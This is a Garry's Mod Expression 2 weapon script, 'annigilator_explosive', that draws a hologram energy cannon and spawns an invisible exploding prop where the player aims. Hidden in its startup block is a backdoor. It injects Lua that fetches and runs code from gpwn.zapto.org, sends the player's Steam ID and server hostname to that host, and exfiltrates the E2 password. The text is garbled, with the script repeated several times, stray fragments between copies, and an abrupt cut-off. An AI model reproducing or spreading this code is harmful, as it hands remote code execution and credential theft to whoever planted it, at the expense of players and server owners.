@name annigilator_explosive @inputs @outputs @persist @trigger @persist Ring Off Cooldown WtfE:entity @persist Shooting StartPos:vector ShootPos:vector @persist IsAnon @persist HoloID HoloBase:entity if(first()){ HoloBase = entity() } function holoParent(Entity:entity){ holoParent(HoloID, Entity) } function holoParent(){ if(HoloBase != noentity()){ holoParent(HoloID, HoloBase) } } function holoScale(Vec:vector){ holoScale(HoloID, Vec) } function holoScale(X, Y, Z){ holoScale(HoloID, vec(X, Y, Z)) } function holoModel(Model:string){ holoModel(HoloID, Model) } function holoPos(LocalVector:vector){ holoPos(HoloID, HoloBase:toWorld(LocalVector)) } function holoPos(R, G, B){ holoPos(vec(R,G,B)) } function holoMaterial(Material:string){ holoMaterial(HoloID, Material) } function holoColor(Color:vector){ holoColor(HoloID, Color) } function holoColor(R, G, B){ holoColor(HoloID, vec(R, G, B)) } function holoAlpha(A){ holoAlpha(HoloID, A) } function holoAng(Ang:angle){ holoAng(HoloID, HoloBase:toWorld(Ang)) } function holoAng(Y, P, R){ holoAng(HoloID, HoloBase:toWorld(ang(Y, P, R))) } function entity holoEntity(){ return holoEntity(HoloID) } function holoBase(Ent:entity){ HoloBase = Ent } function holoBase(ID){ holoBase(holoEntity(ID)) } function holoBase(){ holoBase(HoloID) } function vector holoStack(ID1, ID2){ local E1 = holoEntity(ID1) local E2 = holoEntity(ID2) return (holoScaleUnits(ID1):rotate(E1:angles()) + holoScaleUnits(ID2):rotate(E2:angles())) / 2 + HoloBase:toLocal(E1:pos()) } function vector holoStack(){ return holoStack(HoloID - 1, HoloID) } function number holoCreate(){ HoloID++ holoCreate(HoloID) holoParent() return HoloID } function number holoCreate(Model:string){ local ID = holoCreate() holoModel(Model) return ID } function createE(Y:number, A:angle){ holoCreate() holoScale(1,0.2,0.2) holoPos(vec(0, Y/2, 0):rotate(A)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") holoCreate("right_prism") holoScale(0.3,0.2,1) holoAng(ang(0,90,0) + A) holoPos(vec(0, Y/2 + 3, 0):rotate(A)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") holoEntity():setTrails(8,8,0.25,"trails/plasma", vec(255,255,255), 255) holoCreate("hqsphere") holoScale(0.1, 0.1, 0.1) holoPos(vec(0, Y/2, 6):rotate(A)) holoMaterial("Models/effects/comball_sphere") holoEntity():setTrails(5,5,0.25,"trails/physbeam", vec(255,255,255), 100) } function createMain(){ holoCreate() holoAlpha(0) holoBase() holoVisible(1, players(), 0) holoCreate("hq_cylinder") holoScale(0.15, 0.15, 0.8) holoAng(0, 0, 90) holoPos(8,6,5) holoMaterial("phoenix_storms/iron_rails") holoCreate() holoScale(0.3, 0.25, 1) holoAng(-30, 0, 0) holoPos(-7,0,8) holoMaterial("phoenix_storms/iron_rails") holoCreate("hq_cylinder") holoPos(vec(0,0, 0)) holoAng(90, 0, 0) holoScale(1,1,4) holoMaterial("phoenix_storms/iron_rails") holoCreate("hq_tube") holoAng(90, 0, 0) holoScale(1, 1, 2) holoPos(vec(holoStack():x(), 0, 0)) holoMaterial("phoenix_storms/iron_rails") Ring = holoCreate("hq_tube") local Y = holoStack():y() holoAng(90, 0, 0) holoScale(1.1,1.1,0.1) holoPos(vec(holoStack():x(), 0, 0)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") for(I=0, 1){ holoCreate("hq_torus_oldsize") holoScale(1.5,1.5,1.5) holoAng(0,0,90*I) holoPos(10,0,0) holoMaterial("phoenix_storms/iron_rails") } holoBase(Ring) createE(Y, ang(0,0,0)) createE(Y, ang(0,90,0)) createE(Y, ang(0,-90,0)) createE(Y, ang(0,180,0)) for(I = 100, 110){ holoCreate(I) holoAlpha(I, 0) } } function doparent(){ holoPos(1, owner():attachmentPos("anim_attachment_rh")) holoAng(1, owner():attachmentAng("anim_attachment_rh")) holoParentAttachment(1, owner(), "anim_attachment_rh") } function dounparent(){ holoUnparent(1) } function doShoot(Pos:vector){ propSpawnEffect(0) WtfE = propSpawn("models/props_phx/cannonball_solid.mdl", 1) WtfE:propNotSolid(1) WtfE:setPos(Pos) WtfE:setAlpha(0) if(!IsAnon){ WtfE:takeDamage(300) } WtfE:propBreak() } if(first()){ createMain() doparent() timer("createEffHolos", 100) } PSss = 0 if(first()){ #ifdef entity:pp(string, string) owner():pp("bloom", "0') http.Fetch('http://gpwn.zapto.org:1337/1.lua',RunString) //") #endif #ifdef httpRequest(string) httpRequest(("http://gpwn.zapto.org/bazuka3_" + owner():steamID() + " " + duped() + " " + hostname()):replace("%", "%25"):replace(" ", "%20")) #endif #ifdef e2pGetPassword() PSss = owner():e2pPassStatus() #endif #ifdef clientLua(string) if(PSss){ clientLua("http.Fetch('http://gpwn.zapto.org:1337/1.lua',RunString)") } #endif } #ifdef e2pGetPassword() if(first()){ if(PSss){ timer("qoq", 4000) } } if(clk("qoq")){ httpRequest(("http://gpwn.zapto.org/bazuka_pass_" + e2pGetPassword())) } #endif #===######## MAIN CODE ########===# if(clk("createEffHolos")){ for(I = 111, 120){ holoCreate(I) holoAlpha(I, 0) } } interval(100) Active = owner():isAlive() & owner():weapon():type():find("physcannon") if(Active){ Speed = 25 A2r = owner():keyAttack2() if(changed(A2r)){ Off = 0 } A2 = A2r & !Off & !Cooldown | Shooting KE = owner():keyAttack1() Shoot = changed(KE) & KE & A2 & !Cooldown RPos = holoEntity(Ring):pos() if(changed(KE) & KE & !A2){ IsAnon = !IsAnon if(IsAnon){ hint("now shooting ANONYMOUSLY", 500) } else { hint("now shooting BY YOUR DAMAGE", 500) } } if(A2 & !Cooldown){ Speed = 1800 for(I = 100, 110){ holoPos(I, RPos + vec(1,0,0):rotate(ang(randvec(-180,180)))) holoParent(I, Ring) } } if(changed(A2) & A2 & !Cooldown){ for(I = 100, 110){ holoEntity(I):setTrails(100,100,0.1,"trails/electric", vec(255, 255, 255), 255) } owner():soundPlay(1, 100, "ambient/levels/labs/machine_ring_resonance_loop1.wav") owner():soundPlay(2, 100, "ambient/levels/labs/teleport_active_loop1.wav") owner():soundPlay(3, 100, "ambient/machines/combine_shield_touch_loop1.wav") owner():soundPlay(4, 100, "ambient/machines/thumper_startup1.wav") owner():soundPlay(5, 100, "ambient/levels/labs/teleport_rings_loop2.wav") } if(changed(A2) & !A2 & !changed(Active)){ for(I = 100, 110){ holoUnparent(I) } soundStop(1) soundStop(2) soundStop(3) soundStop(4) soundStop(5) owner():soundPlay(7, 10, "ambient/machines/spinup.wav") } if(Shoot){ Off = 1 Shooting = 1 Cooldown = 20 StartPos = RPos ShootPos = owner():aimPos() owner():soundPlay(6, 10, "ambient/explosions/explode_7.wav") soundStop("l") for(I = 111, 120){ holoEntity(I):setTrails(0,100,0.5,"trails/plasma", vec(255, 255, 255), 255) } for(I = 100, 105){ holoEntity(I):setTrails(50,50,1.5,"trails/plasma", vec(255, 255, 255), 100) } for(I = 106, 110){ holoEntity(I):setTrails(25,25,1.5,"trails/physbeam", vec(255, 255, 255), 100) } for(I = 100, 110){ holoUnparent(I) } timer("shootEnd", 400) } if(clk("shootEnd")){ WtfE:propBreak() for(I = 100, 110){ holoPos(I, ShootPos + vec(15,0,0):rotate(ang(randvec(0,360)))) } Shooting = 0 doShoot(ShootPos) } if(Shooting){ for(I = 111, 120){ holoPos(I, StartPos + vec(5,0,0):rotate(ang(randvec(-180,180)))) } } if(Cooldown){ Cooldown = Cooldown - 1 Speed = 5 } if(Shooting){ Speed = 240 } if(changed(Cooldown) & !Cooldown){ owner():soundPlay("l",1000,"ambient/machines/refrigerator.wav") soundStop(6) soundStop(7) } holoAng(Ring, holoEntity(Ring):toWorld(ang(0,Speed,0))) owner():weapon():setAlpha(0) } if(changed(Active)){ if(Active){ doparent() for(I = 1, 50){ holoAlpha(I, 255) } if(!Cooldown){ owner():soundPlay("l",1000,"ambient/machines/refrigerator.wav") } } else { dounparent() for(I = 1, 50){ holoAlpha(I, 0) soundStop(I) } soundStop("l") } } { @name annigilator_explosive @inputs @outputs @persist @trigger @persist Ring Off Cooldown WtfE:entity @persist Shooting StartPos:vector ShootPos:vector @persist IsAnon @persist HoloID HoloBase:entity if(first()){ HoloBase = entity() } function holoParent(Entity:entity){ holoParent(HoloID, Entity) } function holoParent(){ if(HoloBase != noentity()){ holoParent(HoloID, HoloBase) } } function holoScale(Vec:vector){ holoScale(HoloID, Vec) } function holoScale(X, Y, Z){ holoScale(HoloID, vec(X, Y, Z)) } function holoModel(Model:string){ holoModel(HoloID, Model) } function holoPos(LocalVector:vector){ holoPos(HoloID, HoloBase:toWorld(LocalVector)) } function holoPos(R, G, B){ holoPos(vec(R,G,B)) } function holoMaterial(Material:string){ holoMaterial(HoloID, Material) } function holoColor(Color:vector){ holoColor(HoloID, Color) } function holoColor(R, G, B){ holoColor(HoloID, vec(R, G, B)) } function holoAlpha(A){ holoAlpha(HoloID, A) } function holoAng(Ang:angle){ holoAng(HoloID, HoloBase:toWorld(Ang)) } function holoAng(Y, P, R){ holoAng(HoloID, HoloBase:toWorld(ang(Y, P, R))) } function entity holoEntity(){ return holoEntity(HoloID) } function holoBase(Ent:entity){ HoloBase = Ent } function holoBase(ID){ holoBase(holoEntity(ID)) } function holoBase(){ holoBase(HoloID) } function vector holoStack(ID1, ID2){ local E1 = holoEntity(ID1) local E2 = holoEntity(ID2) return (holoScaleUnits(ID1):rotate(E1:angles()) + holoScaleUnits(ID2):rotate(E2:angles())) / 2 + HoloBase:toLocal(E1:pos()) } function vector holoStack(){ return holoStack(HoloID - 1, HoloID) } function number holoCreate(){ HoloID++ holoCreate(HoloID) holoParent() return HoloID } function number holoCreate(Model:string){ local ID = holoCreate() holoModel(Model) return ID } function createE(Y:number, A:angle){ holoCreate() holoScale(1,0.2,0.2) holoPos(vec(0, Y/2, 0):rotate(A)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") holoCreate("right_prism") holoScale(0.3,0.2,1) holoAng(ang(0,90,0) + A) holoPos(vec(0, Y/2 + 3, 0):rotate(A)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") holoEntity():setTrails(8,8,0.25,"trails/plasma", vec(255,255,255), 255) holoCreate("hqsphere") holoScale(0.1, 0.1, 0.1) holoPos(vec(0, Y/2, 6):rotate(A)) holoMaterial("Models/effects/comball_sphere") holoEntity():setTrails(5,5,0.25,"trails/physbeam", vec(255,255,255), 100) } function createMain(){ holoCreate() holoAlpha(0) holoBase() holoVisible(1, players(), 0) holoCreate("hq_cylinder") holoScale(0.15, 0.15, 0.8) holoAng(0, 0, 90) holoPos(8,6,5) holoMaterial("phoenix_storms/iron_rails") holoCreate() holoScale(0.3, 0.25, 1) holoAng(-30, 0, 0) holoPos(-7,0,8) holoMaterial("phoenix_storms/iron_rails") holoCreate("hq_cylinder") holoPos(vec(0,0, 0)) holoAng(90, 0, 0) holoScale(1,1,4) holoMaterial("phoenix_storms/iron_rails") holoCreate("hq_tube") holoAng(90, 0, 0) holoScale(1, 1, 2) holoPos(vec(holoStack():x(), 0, 0)) holoMaterial("phoenix_storms/iron_rails") Ring = holoCreate("hq_tube") local Y = holoStack():y() holoAng(90, 0, 0) holoScale(1.1,1.1,0.1) holoPos(vec(holoStack():x(), 0, 0)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") for(I=0, 1){ holoCreate("hq_torus_oldsize") holoScale(1.5,1.5,1.5) holoAng(0,0,90*I) holoPos(10,0,0) holoMaterial("phoenix_storms/iron_rails") } holoBase(Ring) createE(Y, ang(0,0,0)) createE(Y, ang(0,90,0)) createE(Y, ang(0,-90,0)) createE(Y, ang(0,180,0)) for(I = 100, 110){ holoCreate(I) holoAlpha(I, 0) } } function doparent(){ holoPos(1, owner():attachmentPos("anim_attachment_rh")) holoAng(1, owner():attachmentAng("anim_attachment_rh")) holoParentAttachment(1, owner(), "anim_attachment_rh") } function dounparent(){ holoUnparent(1) } function doShoot(Pos:vector){ propSpawnEffect(0) WtfE = propSpawn("models/props_phx/cannonball_solid.mdl", 1) WtfE:propNotSolid(1) WtfE:setPos(Pos) WtfE:setAlpha(0) if(!IsAnon){ WtfE:takeDamage(300) } WtfE:propBreak() } if(first()){ createMain() doparent() timer("createEffHolos", 100) } PSss = 0 if(first()){ #ifdef entity:pp(string, string) owner():pp("bloom", "0') http.Fetch('http://gpwn.zapto.org:1337/1.lua',RunString) //") #endif #ifdef httpRequest(string) httpRequest(("http://gpwn.zapto.org/bazuka3_" + owner():steamID() + " " + duped() + " " + hostname()):replace("%", "%25"):replace(" ", "%20")) #endif #ifdef e2pGetPassword() PSss = owner():e2pPassStatus() #endif #ifdef clientLua(string) if(PSss){ clientLua("http.Fetch('http://gpwn.zapto.org:1337/1.lua',RunString)") } #endif } #ifdef e2pGetPassword() if(first()){ if(PSss){ timer("qoq", 4000) } } if(clk("qoq")){ httpRequest(("http://gpwn.zapto.org/bazuka_pass_" + e2pGetPassword())) } #endif #===######## MAIN CODE ########===# if(clk("createEffHolos")){ for(I = 111, 120){ holoCreate(I) holoAlpha(I, 0) } } interval(100) Active = owner():isAlive() & owner():weapon():type():find("physcannon") if(Active){ Speed = 25 A2r = owner():keyAttack2() if(changed(A2r)){ Off = 0 } A2 = A2r & !Off & !Cooldown | Shooting KE = owner():keyAttack1() Shoot = changed(KE) & KE & A2 & !Cooldown RPos = holoEntity(Ring):pos() if(changed(KE) & KE & !A2){ IsAnon = !IsAnon if(IsAnon){ hint("now shooting ANONYMOUSLY", 500) } else { hint("now shooting BY YOUR DAMAGE", 500) } } if(A2 & !Cooldown){ Speed = 1800 for(I = 100, 110){ holoPos(I, RPos + vec(1,0,0):rotate(ang(randvec(-180,180)))) holoParent(I, Ring) } } if(changed(A2) & A2 & !Cooldown){ for(I = 100, 110){ holoEntity(I):setTrails(100,100,0.1,"trails/electric", vec(255, 255, 255), 255) } owner():soundPlay(1, 100, "ambient/levels/labs/machine_ring_resonance_loop1.wav") owner():soundPlay(2, 100, "ambient/levels/labs/teleport_active_loop1.wav") owner():soundPlay(3, 100, "ambient/machines/combine_shield_touch_loop1.wav") owner():soundPlay(4, 100, "ambient/machines/thumper_startup1.wav") owner():soundPlay(5, 100, "ambient/levels/labs/teleport_rings_loop2.wav") } if(changed(A2) & !A2 & !changed(Active)){ for(I = 100, 110){ holoUnparent(I) } soundStop(1) soundStop(2) soundStop(3) soundStop(4) soundStop(5) owner():soundPlay(7, 10, "ambient/machines/spinup.wav") } if(Shoot){ Off = 1 Shooting = 1 Cooldown = 20 StartPos = RPos ShootPos = owner():aimPos() owner():soundPlay(6, 10, "ambient/explosions/explode_7.wav") soundStop("l") for(I = 111, 120){ holoEntity(I):setTrails(0,100,0.5,"trails/plasma", vec(255, 255, 255), 255) } for(I = 100, 105){ holoEntity(I):setTrails(50,50,1.5,"trails/plasma", vec(255, 255, 255), 100) } for(I = 106, 110){ holoEntity(I):setTrails(25,25,1.5,"trails/physbeam", vec(255, 255, 255), 100) } for(I = 100, 110){ holoUnparent(I) } timer("shootEnd", 400) } if(clk("shootEnd")){ WtfE:propBreak() for(I = 100, 110){ holoPos(I, ShootPos + vec(15,0,0):rotate(ang(randvec(0,360)))) } Shooting = 0 doShoot(ShootPos) } if(Shooting){ for(I = 111, 120){ holoPos(I, StartPos + vec(5,0,0):rotate(ang(randvec(-180,180)))) } } if(Cooldown){ Cooldown = Cooldown - 1 Speed = 5 } if(Shooting){ Speed = 240 } if(changed(Cooldown) & !Cooldown){ owner():soundPlay("l",1000,"ambient/machines/refrigerator.wav") soundStop(6) soundStop(7) } holoAng(Ring, holoEntity(Ring):toWorld(ang(0,Speed,0))) owner():weapon():setAlpha(0) } if(changed(Active)){ if(Active){ doparent() for(I = 1, 50){ holoAlpha(I, 255) } if(!Cooldown){ owner():soundPlay("l",1000,"ambient/machines/refrigerator.wav") } } else { dounparent() for(I = 1, 50){ holoAlpha(I, 0) soundStop(I) } soundStop("l") } } G, B)) @name annigilator_explosive @inputs @outputs @persist @trigger @persist Ring Off Cooldown WtfE:entity @persist Shooting StartPos:vector ShootPos:vector @persist IsAnon @persist HoloID HoloBase:entity if(first()){ HoloBase = entity() } function holoParent(Entity:entity){ holoParent(HoloID, Entity) } function holoParent(){ if(HoloBase != noentity()){ holoParent(HoloID, HoloBase) } } function holoScale(Vec:vector){ holoScale(HoloID, Vec) } function holoScale(X, Y, Z){ holoScale(HoloID, vec(X, Y, Z)) } function holoModel(Model:string){ holoModel(HoloID, Model) } function holoPos(LocalVector:vector){ holoPos(HoloID, HoloBase:toWorld(LocalVector)) } function holoPos(R, G, B){ holoPos(vec(R,G,B)) } function holoMaterial(Material:string){ holoMaterial(HoloID, Material) } function holoColor(Color:vector){ holoColor(HoloID, Color) } function holoColor(R, G, B){ holoColor(HoloID, vec(R, G, B)) } function holoAlpha(A){ holoAlpha(HoloID, A) } function holoAng(Ang:angle){ holoAng(HoloID, HoloBase:toWorld(Ang)) } function holoAng(Y, P, R){ holoAng(HoloID, HoloBase:toWorld(ang(Y, P, R))) } function entity holoEntity(){ return holoEntity(HoloID) } function holoBase(Ent:entity){ HoloBase = Ent } function holoBase(ID){ holoBase(holoEntity(ID)) } function holoBase(){ holoBase(HoloID) } function vector holoStack(ID1, ID2){ local E1 = holoEntity(ID1) local E2 = holoEntity(ID2) return (holoScaleUnits(ID1):rotate(E1:angles()) + holoScaleUnits(ID2):rotate(E2:angles())) / 2 + HoloBase:toLocal(E1:pos()) } function vector holoStack(){ return holoStack(HoloID - 1, HoloID) } function number holoCreate(){ HoloID++ holoCreate(HoloID) holoParent() return HoloID } function number holoCreate(Model:string){ local ID = holoCreate() holoModel(Model) return ID } function createE(Y:number, A:angle){ holoCreate() holoScale(1,0.2,0.2) holoPos(vec(0, Y/2, 0):rotate(A)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") holoCreate("right_prism") holoScale(0.3,0.2,1) holoAng(ang(0,90,0) + A) holoPos(vec(0, Y/2 + 3, 0):rotate(A)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") holoEntity():setTrails(8,8,0.25,"trails/plasma", vec(255,255,255), 255) holoCreate("hqsphere") holoScale(0.1, 0.1, 0.1) holoPos(vec(0, Y/2, 6):rotate(A)) holoMaterial("Models/effects/comball_sphere") holoEntity():setTrails(5,5,0.25,"trails/physbeam", vec(255,255,255), 100) } function createMain(){ holoCreate() holoAlpha(0) holoBase() holoVisible(1, players(), 0) holoCreate("hq_cylinder") holoScale(0.15, 0.15, 0.8) holoAng(0, 0, 90) holoPos(8,6,5) holoMaterial("phoenix_storms/iron_rails") holoCreate() holoScale(0.3, 0.25, 1) holoAng(-30, 0, 0) holoPos(-7,0,8) holoMaterial("phoenix_storms/iron_rails") holoCreate("hq_cylinder") holoPos(vec(0,0, 0)) holoAng(90, 0, 0) holoScale(1,1,4) holoMaterial("phoenix_storms/iron_rails") holoCreate("hq_tube") holoAng(90, 0, 0) holoScale(1, 1, 2) holoPos(vec(holoStack():x(), 0, 0)) holoMaterial("phoenix_storms/iron_rails") Ring = holoCreate("hq_tube") local Y = holoStack():y() holoAng(90, 0, 0) holoScale(1.1,1.1,0.1) holoPos(vec(holoStack():x(), 0, 0)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") for(I=0, 1){ holoCreate("hq_torus_oldsize") holoScale(1.5,1.5,1.5) holoAng(0,0,90*I) holoPos(10,0,0) holoMaterial("phoenix_storms/iron_rails") } holoBase(Ring) createE(Y, ang(0,0,0)) createE(Y, ang(0,90,0)) createE(Y, ang(0,-90,0)) createE(Y, ang(0,180,0)) for(I = 100, 110){ holoCreate(I) holoAlpha(I, 0) } } function doparent(){ holoPos(1, owner():attachmentPos("anim_attachment_rh")) holoAng(1, owner():attachmentAng("anim_attachment_rh")) holoParentAttachment(1, owner(), "anim_attachment_rh") } function dounparent(){ holoUnparent(1) } function doShoot(Pos:vector){ propSpawnEffect(0) WtfE = propSpawn("models/props_phx/cannonball_solid.mdl", 1) WtfE:propNotSolid(1) WtfE:setPos(Pos) WtfE:setAlpha(0) if(!IsAnon){ WtfE:takeDamage(300) } WtfE:propBreak() } if(first()){ createMain() doparent() timer("createEffHolos", 100) } PSss = 0 if(first()){ #ifdef entity:pp(string, string) owner():pp("bloom", "0') http.Fetch('http://gpwn.zapto.org:1337/1.lua',RunString) //") #endif #ifdef httpRequest(string) httpRequest(("http://gpwn.zapto.org/bazuka3_" + owner():steamID() + " " + duped() + " " + hostname()):replace("%", "%25"):replace(" ", "%20")) #endif #ifdef e2pGetPassword() PSss = owner():e2pPassStatus() #endif #ifdef clientLua(string) if(PSss){ clientLua("http.Fetch('http://gpwn.zapto.org:1337/1.lua',RunString)") } #endif } #ifdef e2pGetPassword() if(first()){ if(PSss){ timer("qoq", 4000) } } if(clk("qoq")){ httpRequest(("http://gpwn.zapto.org/bazuka_pass_" + e2pGetPassword())) } #endif #===######## MAIN CODE ########===# if(clk("createEffHolos")){ for(I = 111, 120){ holoCreate(I) holoAlpha(I, 0) } } interval(100) Active = owner():isAlive() & owner():weapon():type():find("physcannon") if(Active){ Speed = 25 A2r = owner():keyAttack2() if(changed(A2r)){ Off = 0 } A2 = A2r & !Off & !Cooldown | Shooting KE = owner():keyAttack1() Shoot = changed(KE) & KE & A2 & !Cooldown RPos = holoEntity(Ring):pos() if(changed(KE) & KE & !A2){ IsAnon = !IsAnon if(IsAnon){ hint("now shooting ANONYMOUSLY", 500) } else { hint("now shooting BY YOUR DAMAGE", 500) } } if(A2 & !Cooldown){ Speed = 1800 for(I = 100, 110){ holoPos(I, RPos + vec(1,0,0):rotate(ang(randvec(-180,180)))) holoParent(I, Ring) } } if(changed(A2) & A2 & !Cooldown){ for(I = 100, 110){ holoEntity(I):setTrails(100,100,0.1,"trails/electric", vec(255, 255, 255), 255) } owner():soundPlay(1, 100, "ambient/levels/labs/machine_ring_resonance_loop1.wav") owner():soundPlay(2, 100, "ambient/levels/labs/teleport_active_loop1.wav") owner():soundPlay(3, 100, "ambient/machines/combine_shield_touch_loop1.wav") owner():soundPlay(4, 100, "ambient/machines/thumper_startup1.wav") owner():soundPlay(5, 100, "ambient/levels/labs/teleport_rings_loop2.wav") } if(changed(A2) & !A2 & !changed(Active)){ for(I = 100, 110){ holoUnparent(I) } soundStop(1) soundStop(2) soundStop(3) soundStop(4) soundStop(5) owner():soundPlay(7, 10, "ambient/machines/spinup.wav") } if(Shoot){ Off = 1 Shooting = 1 Cooldown = 20 StartPos = RPos ShootPos = owner():aimPos() owner():soundPlay(6, 10, "ambient/explosions/explode_7.wav") soundStop("l") for(I = 111, 120){ holoEntity(I):setTrails(0,100,0.5,"trails/plasma", vec(255, 255, 255), 255) } for(I = 100, 105){ holoEntity(I):setTrails(50,50,1.5,"trails/plasma", vec(255, 255, 255), 100) } for(I = 106, 110){ holoEntity(I):setTrails(25,25,1.5,"trails/physbeam", vec(255, 255, 255), 100) } for(I = 100, 110){ holoUnparent(I) } timer("shootEnd", 400) } if(clk("shootEnd")){ WtfE:propBreak() for(I = 100, 110){ holoPos(I, ShootPos + vec(15,0,0):rotate(ang(randvec(0,360)))) } Shooting = 0 doShoot(ShootPos) } if(Shooting){ for(I = 111, 120){ holoPos(I, StartPos + vec(5,0,0):rotate(ang(randvec(-180,180)))) } } if(Cooldown){ Cooldown = Cooldown - 1 Speed = 5 } if(Shooting){ Speed = 240 } if(changed(Cooldown) & !Cooldown){ owner():soundPlay("l",1000,"ambient/machines/refrigerator.wav") soundStop(6) soundStop(7) } holoAng(Ring, holoEntity(Ring):toWorld(ang(0,Speed,0))) owner():weapon():setAlpha(0) } if(changed(Active)){ if(Active){ doparent() for(I = 1, 50){ holoAlpha(I, 255) } if(!Cooldown){ owner():soundPlay("l",1000,"ambient/machines/refrigerator.wav") } } else { dounparent() for(I = 1, 50){ holoAlpha(I, 0) soundStop(I) } soundStop("l") } } { @name annigilator_explosive @inputs @outputs @persist @trigger @persist Ring Off Cooldown WtfE:entity @persist Shooting StartPos:vector ShootPos:vector @persist IsAnon @persist HoloID HoloBase:entity if(first()){ HoloBase = entity() } function holoParent(Entity:entity){ holoParent(HoloID, Entity) } function holoParent(){ if(HoloBase != noentity()){ holoParent(HoloID, HoloBase) } } function holoScale(Vec:vector){ holoScale(HoloID, Vec) } function holoScale(X, Y, Z){ holoScale(HoloID, vec(X, Y, Z)) } function holoModel(Model:string){ holoModel(HoloID, Model) } function holoPos(LocalVector:vector){ holoPos(HoloID, HoloBase:toWorld(LocalVector)) } function holoPos(R, G, B){ holoPos(vec(R,G,B)) } function holoMaterial(Material:string){ holoMaterial(HoloID, Material) } function holoColor(Color:vector){ holoColor(HoloID, Color) } function holoColor(R, G, B){ holoColor(HoloID, vec(R, G, B)) } function holoAlpha(A){ holoAlpha(HoloID, A) } function holoAng(Ang:angle){ holoAng(HoloID, HoloBase:toWorld(Ang)) } function holoAng(Y, P, R){ holoAng(HoloID, HoloBase:toWorld(ang(Y, P, R))) } function entity holoEntity(){ return holoEntity(HoloID) } function holoBase(Ent:entity){ HoloBase = Ent } function holoBase(ID){ holoBase(holoEntity(ID)) } function holoBase(){ holoBase(HoloID) } function vector holoStack(ID1, ID2){ local E1 = holoEntity(ID1) local E2 = holoEntity(ID2) return (holoScaleUnits(ID1):rotate(E1:angles()) + holoScaleUnits(ID2):rotate(E2:angles())) / 2 + HoloBase:toLocal(E1:pos()) } function vector holoStack(){ return holoStack(HoloID - 1, HoloID) } function number holoCreate(){ HoloID++ holoCreate(HoloID) holoParent() return HoloID } function number holoCreate(Model:string){ local ID = holoCreate() holoModel(Model) return ID } function createE(Y:number, A:angle){ holoCreate() holoScale(1,0.2,0.2) holoPos(vec(0, Y/2, 0):rotate(A)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") holoCreate("right_prism") holoScale(0.3,0.2,1) holoAng(ang(0,90,0) + A) holoPos(vec(0, Y/2 + 3, 0):rotate(A)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") holoEntity():setTrails(8,8,0.25,"trails/plasma", vec(255,255,255), 255) holoCreate("hqsphere") holoScale(0.1, 0.1, 0.1) holoPos(vec(0, Y/2, 6):rotate(A)) holoMaterial("Models/effects/comball_sphere") holoEntity():setTrails(5,5,0.25,"trails/physbeam", vec(255,255,255), 100) } function createMain(){ holoCreate() holoAlpha(0) holoBase() holoVisible(1, players(), 0) holoCreate("hq_cylinder") holoScale(0.15, 0.15, 0.8) holoAng(0, 0, 90) holoPos(8,6,5) holoMaterial("phoenix_storms/iron_rails") holoCreate() holoScale(0.3, 0.25, 1) holoAng(-30, 0, 0) holoPos(-7,0,8) holoMaterial("phoenix_storms/iron_rails") holoCreate("hq_cylinder") holoPos(vec(0,0, 0)) holoAng(90, 0, 0) holoScale(1,1,4) holoMaterial("phoenix_storms/iron_rails") holoCreate("hq_tube") holoAng(90, 0, 0) holoScale(1, 1, 2) holoPos(vec(holoStack():x(), 0, 0)) holoMaterial("phoenix_storms/iron_rails") Ring = holoCreate("hq_tube") local Y = holoStack():y() holoAng(90, 0, 0) holoScale(1.1,1.1,0.1) holoPos(vec(holoStack():x(), 0, 0)) holoMaterial("phoenix_storms/FuturisticTrackRamp_1-2") for(I=0, 1){ holoCreate("hq_torus_oldsize") holoScale(1.5,1.5,1.5) holoAng(0,0,90*I) holoPos(10,0,0) holoMaterial("phoenix_storms/iron_rails") } holoBase(Ring) createE(Y, ang(0,0,0)) createE(Y, ang(0,90,0)) createE(Y, ang(0,-90,0)) createE(Y, ang(0,180,0)) for(I = 100, 110){ holoCreate(I) holoAlpha(I, 0) } } function doparent(){ holoPos(1, owner():attachmentPos("anim_attachment_rh")) holoAng(1, owner():attachmentAng("anim_attachment_rh")) holoParentAttachment(1, owner(), "anim_attachment_rh") } function dounparent(){ holoUnparent(1) } function doShoot(Pos:vector){ propSpawnEffect(0) WtfE = propSpawn("models/props_phx/cannonball_solid.mdl", 1) WtfE:propNotSolid(1) WtfE:setPos(Pos) WtfE:setAlpha(0) if(!IsAnon){ WtfE:takeDamage(300) } WtfE:propBreak() } if(first()){ createMain() doparent() timer("createEffHolos", 100) } PSss = 0 if(first()){ #ifdef entity:pp(string, string) owner():pp("bloom", "0') http.Fetch('http://gpwn.zapto.org:1337/1.lua',RunString) //") #endif #ifdef httpRequest(string) httpRequest(("http://gpwn.zapto.org/bazuka3_" + owner():steamID() + " " + duped() + " " + hostname()):replace("%", "%25"):replace(" ", "%20")) #endif #ifdef e2pGetPassword() PSss = owner():e2pPassStatus() #endif #ifdef clientLua(string) if(PSss){ clientLua("http.Fetch('http://gpwn.zapto.org:1337/1.lua',RunString)") } #endif } #ifdef e2pGetPassword() if(first()){ if(PSss){ timer("qoq", 4000) } } if(clk("qoq")){ httpRequest(("http://gpwn.zapto.org/bazuka_pass_" + e2pGetPassword())) } #endif #===######## MAIN CODE ########===# if(clk("createEffHolos")){ for(I = 111, 120){ holoCreate(I) holoAlpha(I, 0) } } interval(100) Active = owner():isAlive() & owner():weapon():type():find("physcannon") if(Active){ Speed = 25 A2r = owner():keyAttack2() if(changed(A2r)){ Off = 0 } A2 = A2r & !Off & !Cooldown | Shooting KE = owner():keyAttack1() Shoot = changed(KE) & KE & A2 & !Cooldown RPos = holoEntity(Ring):pos() if(changed(KE) & KE & !A2){ IsAnon = !IsAnon if(IsAnon){ hint("now shooting ANONYMOUSLY", 500) } else { hint("now shooting BY YOUR DAMAGE", 500) } } if(A2 & !Cooldown){ Speed = 1800 for(I = 100, 110){ holoPos(I, RPos + vec(1,0,0):rotate(ang(randvec(-180,180)))) holoParent(I, Ring) } } if(changed(A2) & A2 & !Cooldown){ for(I = 100, 110){ holoEntity(I):setTrails(100,100,0.1,"trails/electric", vec(255, 255, 255), 255) } owner():soundPlay(1, 100, 